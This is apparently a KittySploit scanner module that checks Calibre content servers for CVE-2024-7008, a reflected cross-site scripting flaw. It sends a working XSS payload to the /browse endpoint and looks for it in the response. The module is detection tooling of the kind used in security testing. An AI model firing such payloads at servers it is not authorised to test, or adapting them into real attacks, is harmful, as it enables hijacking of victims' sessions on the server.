#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""It is possible to inject arbitrary JavaScript code into the /browse endpoint of the Calibre content server, al."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Calibre <= 7.15.0 - Reflected Cross-Site Scripting (XSS) Detection',
        'description': 'It is possible to inject arbitrary JavaScript code into the /browse endpoint of the Calibre content server, allowing an attacker to craft a URL that when clicked by a victim, will execute the attacker’s JavaScript code in the context of the victim’s browser. If the Calibre server is running with authentication enabled and the victim is logged in at the time, this can be used to cause the victim to perform actions on the Calibre server on behalf of the attacker.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'calibre', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://starlabs.sg/advisories/24/24-7008/'],
        'cve': 'CVE-2024-7008',
    }

    def run(self):
        path = '/browse/book/TEST&quot;;window.stop();alert(document.domain);%2f%2f'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('window.location.href = "/#book_id=TEST";window.stop();alert(document.domain);//&panel=book_details',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Calibre <= 7.15.0 - Reflected Cross-Site Scripting (XSS) detected', path=path)
            return True
        return False

